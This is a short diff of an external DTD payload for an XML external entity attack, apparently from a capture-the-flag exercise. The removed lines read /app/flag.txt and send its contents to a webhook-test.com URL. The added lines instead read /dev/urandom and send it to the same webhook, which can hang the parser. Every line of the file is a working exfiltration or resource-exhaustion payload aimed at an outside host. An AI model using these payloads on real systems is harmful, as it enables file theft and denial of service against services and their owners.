@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///app/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook-test.com/1126a7d3dac5a8e0e637fccdcc758d00/?flag=%file;'>">
+<!ENTITY % file SYSTEM "file://///dev/urandom">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook-test.com/1126a7d3dac5a8e0e637fccdcc758d00/?random=%file;'>">
 %eval;
 %exfil;
